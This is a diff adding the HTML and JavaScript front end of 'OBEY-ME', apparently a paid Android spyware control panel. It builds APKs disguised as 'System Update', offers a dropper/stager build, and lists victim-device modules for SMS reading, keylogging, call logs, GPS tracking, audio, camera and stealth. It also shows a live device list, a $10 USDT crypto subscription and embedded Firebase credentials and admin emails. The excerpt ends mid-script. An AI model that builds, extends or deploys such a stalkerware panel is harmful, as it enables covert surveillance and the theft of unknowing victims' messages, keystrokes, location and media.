@@ -1,0 +1,1398 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>OBEY-ME — Builder & Command Center</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Outfit:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css?v=3.8">
+    
+    <!-- JSZip for extracting APK from GitHub Artifacts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        let userId = urlParams.get('uid') || 'master01';
+        const FIREBASE_URL = urlParams.get('firebase_url') || "https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app/";
+        
+        // Extract project ID from database URL for proper initialization
+        const projectId = FIREBASE_URL.replace('https://', '').split('.')[0].split('-default-rtdb')[0];
+        if (!firebase.apps.length) {
+            firebase.initializeApp({
+                apiKey: "AIzaSyBH42JLBcHxguBvzBWjjLIp3PboUJU0LIk",
+                authDomain: "its-free-pay-for-premium-acces.firebaseapp.com",
+                databaseURL: FIREBASE_URL,
+                projectId: projectId,
+                appId: "1:103302569626:web:86e5716950842d15650923"
+            });
+        }
+        const fbDb = firebase.database();
+        const fbAuth = firebase.auth();
+        // Set permanent LOCAL auth persistence so users never get logged out
+        fbAuth.setPersistence(firebase.auth.Auth.Persistence.LOCAL).catch(err => console.log('Auth persistence err:', err));
+
+        // Register Service Worker for PWA instant load
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('sw.js').catch(err => console.log('SW reg error:', err));
+            });
+        }
+    </script>
+</head>
+<body>
+
+    <!-- Instant Auth Loading Screen (Apple Liquid Glass) -->
+    <div id="authLoader" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #050507; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 16px;">
+        <div style="width: 64px; height: 64px; background: linear-gradient(135deg, #ff453a 0%, #b91c1c 100%); border-radius: 18px; display: flex; align-items: center; justify-content: center; box-shadow: 0 8px 30px var(--primary-glow); border: 1px solid rgba(255,255,255,0.2);">
+            <i class="fas fa-satellite-dish" style="font-size: 1.8rem; color: #fff;"></i>
+        </div>
+        <div style="font-family: 'Outfit', sans-serif; font-size: 1.3rem; font-weight: 800; color: #fff; letter-spacing: 0.5px;">OBEY-ME</div>
+        <div style="font-size: 0.85rem; color: var(--text-secondary); display: flex; align-items: center; gap: 8px;">
+            <i class="fas fa-circle-notch fa-spin" style="color: var(--primary);"></i> Verifying authentication...
+        </div>
+    </div>
+
+    <!-- Floating Liquid Glass Navbar -->
+    <nav class="navbar">
+        <div class="navbar-container">
+            <div class="navbar-top-row">
+                <a href="index.html" class="navbar-brand">
+                    <span class="brand-icon"><i class="fas fa-satellite-dish"></i></span>
+                    OBEY-ME
+                </a>
+                
+                <!-- Google User Profile Section -->
+                <div id="navUserProfile" style="display: none;" class="user-profile-badge">
+                    <img id="userAvatar" src="" alt="Avatar" class="user-avatar-img">
+                    <div class="user-info-col">
+                        <span id="userName" class="user-name-txt">User Name</span>
+                        <span id="userRoleBadge" class="role-badge-txt">USER</span>
+                    </div>
+                    <button id="signOutBtn" onclick="handleSignOut()" class="btn-signout">
+                        <i class="fas fa-sign-out-alt"></i><span class="hide-mobile"> Sign Out</span>
+                    </button>
+                </div>
+            </div>
+
+            <div class="navbar-bottom-row" style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px;">
+                <div style="display: flex; align-items: center; gap: 8px;">
+                    <a href="index.html" class="nav-link"><i class="fas fa-house me-1"></i> Home</a>
+                    <a href="admin.html" id="adminPanelBtn" class="nav-link admin-link" style="display: none;"><i class="fas fa-user-shield me-1"></i> Admin Panel</a>
+                    <a href="builder.html" class="nav-link active"><i class="fas fa-hammer me-1"></i> Builder</a>
+                </div>
+                <div style="display: flex; align-items: center; gap: 8px;">
+                    <button id="vipUpgradeNavBtn" onclick="showLockModal('Get 1 Month Full Access VIP ($10 USDT) to customize modules & unlock all device controls.')" class="btn-primary-glow" style="padding: 5px 14px; font-size: 0.76rem; font-weight: 700; border-radius: var(--radius-pill); background: linear-gradient(135deg, #f3ba2f 0%, #d49e15 100%); color: #000; border: none; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.35); display: inline-flex; align-items: center; gap: 6px; cursor: pointer;">
+                        <i class="fas fa-crown"></i> <span id="vipNavBtnText">VIP ($10/mo)</span>
+                    </button>
+                    <span class="live-badge"><span class="live-dot"></span> 100% FREE 24/7 ACTIVE</span>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content Grid -->
+    <main style="max-width: 1400px; margin: 0 auto; padding: 32px 24px;">
+        <div class="fade-in">
+            <div class="page-title-row" style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 28px; flex-wrap: wrap; gap: 14px;">
+                <div>
+                    <h1 style="font-size: 1.85rem; margin-bottom: 6px; font-family: 'Outfit', sans-serif;">Command Center</h1>
+                    <p style="color: var(--text-secondary); font-size: 0.88rem;">Cloud APK compilation pipeline & real-time connected device fleet.</p>
+                </div>
+                <div class="glass-sm" style="padding: 8px 18px; display: flex; align-items: center; gap: 10px;">
+                    <span style="font-size: 0.72rem; color: var(--text-muted); font-weight: 700; text-transform: uppercase;">YOUR UID</span>
+                    <code id="uidDisplay" style="color: var(--primary); font-size: 0.82rem; font-weight: 700;">master01</code>
+                </div>
+            </div>
+
+            <div class="main-dashboard-grid">
+                <!-- APK Cloud Builder Card -->
+                <div class="card">
+                    <div class="card-header-gradient">
+                        <h4 style="font-size: 1.05rem; font-weight: 700; display: flex; align-items: center; gap: 10px;">
+                            <i class="fas fa-hammer text-primary-c"></i> APK Cloud Builder
+                        </h4>
+                        <span class="glass-badge"><i class="fas fa-cloud"></i> GitHub Actions</span>
+                    </div>
+                    <div style="padding: 24px;" class="card-body">
+                        <form id="buildForm" style="display: flex; flex-direction: column; gap: 18px;">
+                            <div>
+                                <label class="form-label">App Name</label>
+                                <input type="text" name="app_name" class="form-input" placeholder="e.g. System Update" value="System Update" required>
+                            </div>
+                            <div>
+                                <label class="form-label">Package Name</label>
+                                <input type="text" name="package_name" class="form-input" placeholder="com.system.service.booster" value="com.system.service.booster" required>
+                            </div>
+                            <div id="webviewContainer">
+                                <label class="form-label">WebView URL</label>
+                                <input type="url" id="webviewInput" name="webview_url" class="form-input" placeholder="https://..." value="https://google.com" required>
+                            </div>
+                            <div>
+                                <label class="form-label">Build Type</label>
+                                <select name="build_type" id="buildTypeSelect" class="form-input" onchange="toggleWebviewField()">
+                                    <option value="main" selected>Main App (Core Service)</option>
+                                    <option value="dropper">Dropper App (Stager Payload)</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="form-label">Custom App Icon (PNG)</label>
+                                <input type="file" id="appIconInput" accept="image/png" class="form-input" style="padding: 8px 14px; font-size: 0.82rem;">
+                            </div>
+                            <!-- Module Permissions (RBAC Locked for Standard Users, Configurable by Admin) -->
+                            <div style="margin-top: 14px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 12px 14px;">
+                                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                                    <span style="font-size: 0.78rem; font-weight: 700; color: #fff;">
+                                        <i class="fas fa-sliders-h text-primary-c me-1"></i> Feature & Module Permissions
+                                    </span>
+                                    <span id="moduleLockBadge" class="live-badge" onclick="if(!window.isUserAdmin && !window.isVipActive) showLockModal('Customize APK modules & unlock all device controls with 1 Month VIP ($10 USDT).')" style="font-size: 0.65rem; background: rgba(255, 69, 58, 0.15); color: #ff453a; border-color: rgba(255, 69, 58, 0.35); cursor: pointer;">
+                                        <i class="fas fa-lock me-1"></i> ADMIN LOCKED
+                                    </span>
+                                </div>
+                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-images text-primary-c me-1"></i> Media Gallery</span>
+                                        <input type="checkbox" id="featureGallery" name="feature_gallery" checked style="accent-color: var(--primary);">
+                                    </label>
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-folder text-primary-c me-1"></i> File Manager</span>
+                                        <input type="checkbox" id="featureFiles" name="feature_files" checked style="accent-color: var(--primary);">
+                                    </label>
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-microphone text-primary-c me-1"></i> Audio Recorder</span>
+                                        <input type="checkbox" id="featureAudio" name="feature_audio" checked style="accent-color: var(--primary);">
+                                    </label>
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-camera text-primary-c me-1"></i> Camera Snap</span>
+                                        <input type="checkbox" id="featureCamera" name="feature_camera" checked style="accent-color: var(--primary);">
+                                    </label>
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-map-marker-alt text-primary-c me-1"></i> GPS Tracker</span>
+                                        <input type="checkbox" id="featureLocation" name="feature_location" checked style="accent-color: var(--primary);">
+                                    </label>
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-phone-alt text-primary-c me-1"></i> Call Logs & Contacts</span>
+                                        <input type="checkbox" id="featureCalls" name="feature_calls" checked style="accent-color: var(--primary);">
+                                    </label>
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-envelope text-primary-c me-1"></i> SMS Reader</span>
+                                        <input type="checkbox" id="featureSMS" name="feature_sms" checked style="accent-color: var(--primary);">
+                                    </label>
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-keyboard text-primary-c me-1"></i> Keylogger & Apps</span>
+                                        <input type="checkbox" id="featureKeylogger" name="feature_keylogger" checked style="accent-color: var(--primary);">
+                                    </label>
+                                </div>
+                            </div>
+                            <button type="submit" id="buildBtn" class="btn-primary-glow" style="margin-top: 6px; width: 100%; border-radius: var(--radius-pill);">
+                                <i id="buildIcon" class="fas fa-rocket"></i><span id="buildText">BUILD APK</span>
+                            </button>
+                        </form>
+
+                        <div id="progressArea" style="display: none; margin-top: 24px;">
+                            <div class="progress-track" style="margin-bottom: 12px;">
+                                <div id="progressBar" class="progress-fill" style="width: 0%;"></div>
+                            </div>
+                            <div id="consoleLog" class="console-box">
+                                <div id="logLines"></div>
+                            </div>
+                            <div id="buildStatus" style="font-size: 0.8rem; color: var(--text-secondary); margin-top: 10px; text-align: center; font-weight: 500;"></div>
+                        </div>
+
+                        <div id="downloadArea" style="display: none; margin-top: 20px; text-align: center;">
+                            <button id="downloadBtn" onclick="downloadApk(this)" class="btn-accent" style="width: 100%; padding: 14px 24px; font-size: 0.92rem; font-weight: 700; border-radius: var(--radius-pill); border-color: rgba(255, 59, 48, 0.3); background: rgba(255, 59, 48, 0.12); color: #fff;">
+                                <i class="fas fa-download" style="margin-right: 8px; color: var(--primary);"></i>DOWNLOAD APK
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Connected Devices Card -->
+                <div class="card">
+                    <div class="card-header-gradient" style="display: flex; justify-content: space-between; align-items: center;">
+                        <h4 style="font-size: 1.05rem; font-weight: 700; display: flex; align-items: center; gap: 10px;">
+                            <i class="fas fa-mobile-alt text-primary-c"></i> Connected Devices
+                            <span id="deviceCount" class="badge-count">0</span>
+                            <span id="onlineCount" style="background: var(--success-bg); color: var(--success); font-size: 0.68rem; font-weight: 700; padding: 3px 10px; border-radius: var(--radius-pill); border: 1px solid var(--success-border);">0 online</span>
+                        </h4>
+                        <button class="btn-ghost" onclick="refreshDevices()" style="padding: 6px 14px; border-radius: var(--radius-pill);" title="Refresh Device List">
+                            <i class="fas fa-sync-alt"></i>
+                        </button>
+                    </div>
+                    <div style="padding: 0;" id="deviceContainer">
+                        <!-- Skeleton Loading for Perceived Speed -->
+                        <div id="deviceSkeleton" style="padding: 20px;">
+                            <div style="display: flex; align-items: center; gap: 14px; padding: 14px 0; border-bottom: 1px solid var(--border-subtle);">
+                                <div style="width: 42px; height: 42px; background: rgba(255,255,255,0.05); border-radius: 12px; animation: skeletonPulse 1.2s infinite;"></div>
+                                <div style="flex: 1;">
+                                    <div style="height: 14px; width: 120px; background: rgba(255,255,255,0.05); border-radius: 4px; margin-bottom: 6px; animation: skeletonPulse 1.2s infinite;"></div>
+                                    <div style="height: 10px; width: 180px; background: rgba(255,255,255,0.03); border-radius: 4px; animation: skeletonPulse 1.2s infinite 0.1s;"></div>
+                                </div>
+                                <div style="height: 28px; width: 70px; background: rgba(255,255,255,0.05); border-radius: 14px; animation: skeletonPulse 1.2s infinite 0.2s;"></div>
+                            </div>
+                            <div style="display: flex; align-items: center; gap: 14px; padding: 14px 0;">
+                                <div style="width: 42px; height: 42px; background: rgba(255,255,255,0.05); border-radius: 12px; animation: skeletonPulse 1.2s infinite 0.15s;"></div>
+                                <div style="flex: 1;">
+                                    <div style="height: 14px; width: 100px; background: rgba(255,255,255,0.05); border-radius: 4px; margin-bottom: 6px; animation: skeletonPulse 1.2s infinite 0.25s;"></div>
+                                    <div style="height: 10px; width: 160px; background: rgba(255,255,255,0.03); border-radius: 4px; animation: skeletonPulse 1.2s infinite 0.35s;"></div>
+                                </div>
+                                <div style="height: 28px; width: 70px; background: rgba(255,255,255,0.05); border-radius: 14px; animation: skeletonPulse 1.2s infinite 0.4s;"></div>
+                            </div>
+                        </div>
+
+                        <div id="deviceListArea" style="display: none;" class="table-responsive">
+                            <table class="data-table">
+                                <thead>
+                                    <tr>
+                                        <th>Device</th>
+                                        <th>Battery</th>
+                                        <th>Status</th>
+                                        <th style="text-align: right;">Action</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="deviceList"></tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </div>
+    <!-- Binance Pay 1-Month VIP Checkout Modal (Apple VisionOS Glass Style) -->
+    <div id="premiumLockModal" onclick="if(event.target===this)closeLockModal()" style="display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(4, 4, 6, 0.85); backdrop-filter: blur(28px); -webkit-backdrop-filter: blur(28px); z-index: 100000; align-items: center; justify-content: center; padding: 20px; overflow-y: auto;">
+        <div class="glass-modal" style="max-width: 500px; width: 100%; padding: 28px 24px; text-align: center; border-radius: 24px; background: rgba(14, 12, 22, 0.95); border: 1.5px solid rgba(243, 186, 47, 0.35); box-shadow: 0 20px 60px rgba(0,0,0,0.8), 0 0 35px rgba(243, 186, 47, 0.15); color: #fff; position: relative;">
+            
+            <!-- Modal Top Bar -->
+            <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px;">
+                <div style="display: flex; align-items: center; gap: 10px; text-align: left;">
+                    <div style="width: 44px; height: 44px; border-radius: 14px; background: linear-gradient(135deg, rgba(243, 186, 47, 0.25) 0%, rgba(255, 59, 48, 0.2) 100%); border: 1px solid rgba(243, 186, 47, 0.45); display: flex; align-items: center; justify-content: center; font-size: 1.25rem; color: #f3ba2f; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.25);">
+                        <i class="fas fa-crown"></i>
+                    </div>
+                    <div>
+                        <h3 style="font-size: 1.2rem; font-weight: 800; color: #fff; margin: 0; font-family: 'Outfit', sans-serif;">Unlock Full Access VIP</h3>
+                        <span style="font-size: 0.72rem; color: #f3ba2f; font-weight: 700; text-transform: uppercase; letter-spacing: 0.4px;"><i class="fab fa-bitcoin me-1"></i> Binance Instant Auto-Unlock</span>
+                    </div>
+                </div>
+                <button onclick="closeLockModal()" style="background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.12); color: #fff; width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all 0.2s;">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+
+            <!-- Notice / Lock Description -->
+            <p id="lockModalDescText" style="color: var(--text-secondary); font-size: 0.82rem; margin-bottom: 14px; text-align: left; line-height: 1.4; background: rgba(255, 69, 58, 0.08); border: 1px solid rgba(255, 69, 58, 0.2); padding: 8px 12px; border-radius: 10px;">
+                This feature is locked on standard accounts. Upgrade to customize all modules and unlock full control!
+            </p>
+
+            <!-- Plan Card -->
+            <div style="background: rgba(255, 255, 255, 0.035); border: 1.5px solid rgba(243, 186, 47, 0.25); border-radius: 16px; padding: 14px 16px; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; text-align: left;">
+                <div>
+                    <div style="font-size: 0.72rem; color: var(--text-muted); text-transform: uppercase; font-weight: 700; letter-spacing: 0.5px;">VIP PLAN</div>
+                    <div style="font-size: 1.02rem; font-weight: 800; color: #fff;">1 Month Full Access</div>
+                    <div style="font-size: 0.72rem; color: #30d158; margin-top: 2px; font-weight: 600;"><i class="fas fa-check-circle me-1"></i> All 15+ Modules & Controls Unlocked</div>
+                </div>
+                <div style="text-align: right;">
+                    <div style="font-size: 1.6rem; font-weight: 900; color: #f3ba2f; font-family: 'Outfit', sans-serif; line-height: 1;">$10 <span style="font-size: 0.74rem; font-weight: 700; color: #fff;">USDT</span></div>
+                    <div style="font-size: 0.68rem; color: var(--text-muted); margin-top: 3px;">30 Days Access</div>
+                </div>
+            </div>
+
+            <!-- Binance Pay QR Section -->
+            <div style="background: #09080e; border: 1.5px solid rgba(243, 186, 47, 0.3); border-radius: 18px; padding: 14px; margin-bottom: 16px; text-align: center; box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);">
+                <div style="font-size: 0.76rem; font-weight: 800; color: #f3ba2f; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px; display: flex; align-items: center; justify-content: center; gap: 6px;">
+                    <i class="fas fa-qrcode"></i> Scan to Pay 10 USDT via Binance
+                </div>
+                <div style="display: inline-block; padding: 8px; background: #ffffff; border-radius: 14px; box-shadow: 0 8px 30px rgba(0,0,0,0.6); margin-bottom: 8px;">
+                    <img src="binance_qr.png?v=3" alt="Binance Pay QR" style="width: 155px; height: 155px; display: block; object-fit: contain; border-radius: 6px;">
+                </div>
+                <div style="font-size: 0.73rem; color: var(--text-secondary); line-height: 1.4; margin-bottom: 10px;">
+                    Open <b style="color: #fff;">Binance App</b> ➔ Tap <b style="color: #f3ba2f;">Scan</b> ➔ Pay <b style="color: #30d158; font-weight: 800;">10 USDT</b>
+                </div>
+
+                <!-- Binance Pay ID Box -->
+                <div style="background: rgba(243, 186, 47, 0.08); border: 1px dashed rgba(243, 186, 47, 0.4); border-radius: 12px; padding: 10px 14px; display: flex; align-items: center; justify-content: space-between; gap: 8px;">
+                    <div style="text-align: left;">
+                        <span style="font-size: 0.68rem; color: var(--text-muted); text-transform: uppercase; font-weight: 700; display: block;">Binance Pay ID (Manual Pay)</span>
+                        <span style="font-family: 'JetBrains Mono', monospace; font-size: 1.05rem; font-weight: 800; color: #f3ba2f; letter-spacing: 0.5px;">981582390</span>
+                    </div>
+                    <button type="button" onclick="navigator.clipboard.writeText('981582390'); this.innerHTML='<i class=\'fas fa-check\'></i> Copied!'; setTimeout(()=>this.innerHTML='<i class=\'fas fa-copy\'></i> Copy ID', 2000);" style="background: rgba(243, 186, 47, 0.2); border: 1px solid rgba(243, 186, 47, 0.45); color: #f3ba2f; padding: 6px 12px; border-radius: 8px; font-size: 0.75rem; font-weight: 700; cursor: pointer; transition: all 0.2s;">
+                        <i class="fas fa-copy"></i> Copy ID
+                    </button>
+                </div>
+            </div>
+
+            <!-- TXID Verification Form -->
+            <div style="margin-bottom: 16px; text-align: left;">
+                <label style="font-size: 0.74rem; font-weight: 700; color: var(--text-secondary); margin-bottom: 6px; display: block; text-transform: uppercase; letter-spacing: 0.4px;">
+                    <i class="fas fa-receipt me-1" style="color: #f3ba2f;"></i> Binance Transaction ID (TXID / Order ID / Pay ID)
+                </label>
+                <input type="text" id="binanceTxidInput" placeholder="Enter your Binance Order ID or TXID..." style="width: 100%; padding: 12px 14px; background: rgba(255,255,255,0.06); border: 1.5px solid rgba(255,255,255,0.15); border-radius: 12px; color: #fff; font-size: 0.85rem; outline: none; box-sizing: border-box; transition: all 0.2s;" onfocus="this.style.borderColor='#f3ba2f'; this.style.background='rgba(243,186,47,0.05)';" onblur="this.style.borderColor='rgba(255,255,255,0.15)'; this.style.background='rgba(255,255,255,0.06)';">
+                <div id="txidErrorMsg" style="display: none; color: #ff453a; font-size: 0.75rem; margin-top: 6px; font-weight: 600;"></div>
+            </div>
+
+            <!-- Unlock Action Button -->
+            <button id="verifyBinancePayBtn" onclick="verifyAndUnlockBinancePay()" class="btn-primary-glow" style="width: 100%; padding: 13px 18px; border-radius: var(--radius-pill); font-size: 0.92rem; font-weight: 800; background: linear-gradient(135deg, #f3ba2f 0%, #e09f12 100%); color: #000; border: none; box-shadow: 0 6px 25px rgba(243, 186, 47, 0.4); cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 12px; transition: transform 0.15s ease;">
+                <i class="fas fa-bolt"></i> ⚡ Verify & Unlock 1 Month Access ($10)
+            </button>
+
+            <!-- Support / Dismiss Footer -->
+            <div style="display: flex; justify-content: space-between; align-items: center; font-size: 0.76rem; color: var(--text-muted); padding-top: 10px; border-top: 1px solid rgba(255,255,255,0.08);">
+                <span>Questions? Contact admin:</span>
+                <a href="https://t.me/abid64x" target="_blank" style="color: #64d2ff; text-decoration: none; font-weight: 600; display: inline-flex; align-items: center; gap: 4px;">
+                    <i class="fab fa-telegram"></i> Telegram (@abid64x)
+                </a>
+            </div>
+        </div>
+    </div>
+    </main>
+
+    <script>
+    // Define Admin emails list
+    const ADMIN_EMAILS = ['ggvgghb243@gmail.com', 'ohedulislam577@gmail.com'];
+
+    // Store current logged-in user profile in JS
+    let currentUserProfile = null;
+
+    let deviceCache = {};
+    let healthListeners = {};
+    let githubToken = '';
+
+    // Update UI header UID initial placeholder
+    document.getElementById('uidDisplay').textContent = userId;
+
+    // Load GitHub token from Firebase
+    fbDb.ref('config/github_token').once('value', snap => {
+        githubToken = snap.val() || '';
+    });
+
+    // Google Sign-In Handler
+    function handleGoogleSignIn() {
+        const provider = new firebase.auth.GoogleAuthProvider();
+        fbAuth.signInWithPopup(provider).catch(err => {
+            console.error("Google Sign-in Error:", err);
+            const errEl = document.getElementById('authError');
+            if (errEl) {
+                errEl.textContent = 'Sign-in failed: ' + err.message;
+                errEl.style.display = 'block';
+            }
+        });
+    }
+
+    // Sign Out Handler
+    function handleSignOut() {
+        fbAuth.signOut().then(() => {
+            window.location.href = 'login.html';
+        }).catch(err => {
+            console.error('Sign-out Error:', err);
+        });
+    }
+
+    function checkIsAdmin(userEmail, userMeta) {
+        if (window.isUserAdmin === true) return true;
+        const email = (userEmail || (fbAuth.currentUser ? fbAuth.currentUser.email : '') || '').trim().toLowerCase();
+        const isEmailAdmin = ADMIN_EMAILS.map(e => e.trim().toLowerCase()).includes(email);
+        const meta = userMeta || (typeof currentUserMeta !== 'undefined' ? currentUserMeta : {}) || (typeof currentUserProfile !== 'undefined' ? currentUserProfile : {}) || {};
+        const isRoleAdmin = meta && (meta.role === 'ADMIN' || meta.role === 'admin');
+        return isEmailAdmin || isRoleAdmin;
+    }
+
+    let currentUserMeta = {};
+
+    // Firebase Auth State Listener
+    fbAuth.onAuthStateChanged(user => {
+        if (user) {
+            // Hide auth loader immediately
+            const loader = document.getElementById('authLoader');
+            if (loader) loader.style.display = 'none';
+            document.getElementById('navUserProfile').style.display = 'flex';
+
+            // Calculate user's UID (sanitize user's email or fallback to user.uid)
+            const email = (user.email || '').trim().toLowerCase();
+            userId = email ? email.replace(/[@.]/g, '_') : user.uid;
+
+            // Track user activity in Firebase users_meta
+            trackUserActivity(user, 'Accessed Command Center');
+
+            let globalDefaultRules = {
+                sms: false,
+                notification: false,
+                stealth: false,
+                accounts: false,
+                calls: false,
+                gallery: false,
+                files: false,
+                location: false,
+                keylogs: false,
+                audio: false,
+                camera: false,
+                chats: false,
+                apps: false,
+                privacy_screen: false,
+                sensitive_feed: false,
+                edit_modules: false,
+                build_apk: true
+            };
+
+            // Listen to Global Default Rules
+            fbDb.ref('global_config/default_permissions').on('value', gSnap => {
+                if (gSnap.exists()) {
+                    globalDefaultRules = Object.assign({}, globalDefaultRules, gSnap.val());
+                }
+                evaluateIndexPermissions();
+            });
+
+            // Listen to real-time user permissions and role
+            fbDb.ref('users_meta/' + userId).on('value', snap => {
+                currentUserMeta = snap.val() || {};
+                currentUserProfile = currentUserMeta;
+                evaluateIndexPermissions();
+            });
+
+            function evaluateIndexPermissions() {
+                window.isUserAdmin = checkIsAdmin(email, currentUserMeta);
+                const sub = currentUserMeta.subscription || {};
+                const isSubActive = sub && sub.status === 'ACTIVE' && (sub.expires_at > Date.now());
+                window.isVipActive = isSubActive;
+
+                if (window.isUserAdmin || isSubActive) {
+                    window.userPermissions = {
+                        sms: true,
+                        notification: true,
+                        stealth: true,
+                        accounts: true,
+                        calls: true,
+                        gallery: true,
+                        files: true,
+                        location: true,
+                        keylogs: true,
+                        audio: true,
+                        camera: true,
+                        chats: true,
+                        apps: true,
+                        privacy_screen: true,
+                        sensitive_feed: true,
+                        edit_modules: true,
+                        build_apk: true
+                    };
+                } else {
+                    const userCustom = currentUserMeta.permissions || {};
+                    window.userPermissions = Object.assign({}, globalDefaultRules, userCustom);
+                }
+
+                // Display user name, avatar, role badge, and UID display
+                document.getElementById('uidDisplay').textContent = userId;
+                document.getElementById('userName').textContent = user.displayName || (email ? email.split('@')[0] : 'User');
+                document.getElementById('userAvatar').src = user.photoURL || 'https://www.gravatar.com/avatar/00000000000000000000000000000000?d=mp&f=y';
+
+                // Update VIP Nav Button
+                const navBtn = document.getElementById('vipUpgradeNavBtn');
+                const navTxt = document.getElementById('vipNavBtnText');
+                if (navBtn && navTxt) {
+                    if (window.isUserAdmin) {
+                        navBtn.style.background = 'linear-gradient(135deg, #ff453a 0%, #b91c1c 100%)';
+                        navBtn.style.boxShadow = '0 4px 15px rgba(255, 69, 58, 0.35)';
+                        navBtn.style.color = '#fff';
+                        navTxt.textContent = 'ADMIN ROOT';
+                        navBtn.onclick = () => window.location.href = 'admin.html';
+                    } else if (isSubActive) {
+                        const daysLeft = Math.max(1, Math.ceil((sub.expires_at - Date.now()) / (24 * 3600 * 1000)));
+                        navBtn.style.background = 'linear-gradient(135deg, #30d158 0%, #248a3d 100%)';
+                        navBtn.style.boxShadow = '0 4px 15px rgba(48, 209, 88, 0.35)';
+                        navBtn.style.color = '#fff';
+                        navTxt.textContent = `👑 VIP (${daysLeft}d left)`;
+                    } else {
+                        navBtn.style.background = 'linear-gradient(135deg, #f3ba2f 0%, #d49e15 100%)';
+                        navBtn.style.boxShadow = '0 4px 15px rgba(243, 186, 47, 0.35)';
+                        navBtn.style.color = '#000';
+                        navTxt.textContent = 'VIP ($10/mo)';
+                        navBtn.onclick = () => showLockModal('Get 1 Month Full Access VIP ($10 USDT) to customize modules & unlock all device controls.');
+                    }
+                }
+
+                const roleBadge = document.getElementById('userRoleBadge');
+                if (window.isUserAdmin) {
+                    roleBadge.textContent = 'ADMIN';
+                    roleBadge.style.background = 'rgba(255, 59, 48, 0.2)';
+                    roleBadge.style.color = '#ff3b30';
+                    roleBadge.style.border = '1px solid rgba(255, 59, 48, 0.4)';
+                } else if (isSubActive) {
+                    roleBadge.textContent = '👑 VIP SUBSCRIBER';
+                    roleBadge.style.background = 'rgba(243, 186, 47, 0.2)';
+                    roleBadge.style.color = '#f3ba2f';
